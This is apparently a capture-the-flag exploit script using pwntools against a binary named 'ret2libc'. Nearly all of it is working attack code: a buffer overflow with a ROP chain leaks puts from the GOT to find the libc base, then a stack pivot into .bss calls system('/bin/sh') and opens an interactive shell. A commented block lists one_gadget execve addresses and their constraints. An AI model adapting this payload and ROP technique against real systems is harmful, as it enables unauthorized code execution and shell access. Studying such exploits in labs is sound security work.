#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
elf = ELF('./ret2libc')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./ret2libc')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''
one_gadget = [0x50a37,0xebcf1,0xebcf5,0xebcf8]

puts_got = elf.got['puts']
pop_rdi = 0x000000000040117e # pop rdi ; ret
fake_bss = 0x404d08
payload = b'a' * 0x50 + p64(fake_bss)
payload += flat(
    pop_rdi, puts_got, 0x40120D
)
io.sendafter(b"help u??\n\n", payload)
libc_base = u64(io.recvuntil(b"\n", drop = True) + b'\x00' * 2) - libc.sym['puts']
success("libc_base --> " + hex(libc_base))


pause()

at_bss = b'a' * 0x50 + p64(fake_bss)
at_bss += flat(
    pop_rdi,
    0x404d38,
    libc_base + libc.sym['system'], #404d20
    0x40122A,
    0x40122A,
    b"/bin/sh\x00" 
)
#p()
io.send(at_bss)

io.interactive()

